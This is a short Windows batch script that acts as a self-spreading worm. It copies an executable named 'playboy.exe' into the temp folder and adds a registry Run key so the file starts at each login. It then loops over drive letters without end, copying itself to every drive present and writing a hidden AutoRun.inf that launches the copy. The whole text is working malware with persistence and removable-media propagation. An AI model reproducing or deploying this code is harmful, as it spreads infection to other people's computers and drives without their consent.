set file=playboy.exe
copy %file% %temp%
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V %file% /T REG_SZ /F /D "%temp%\%file%"
:inicio
    for %%D in (A, B, C, D, E, F, G, H, I, J, L, M, N, O, P, Q, R, S, T, U, V, X, Z) do (
        if exist "%%D:\" (
			copy %temp%\%file% "%%D:\%file%"
			(  
			echo ^[autorun^]
			echo open=%file%
			echo shellexecut=%file%
			) > %%D:\AutoRun.inf
			attrib +h "%%D:\AutoRun.inf"
		)
	)
goto inicio	
		 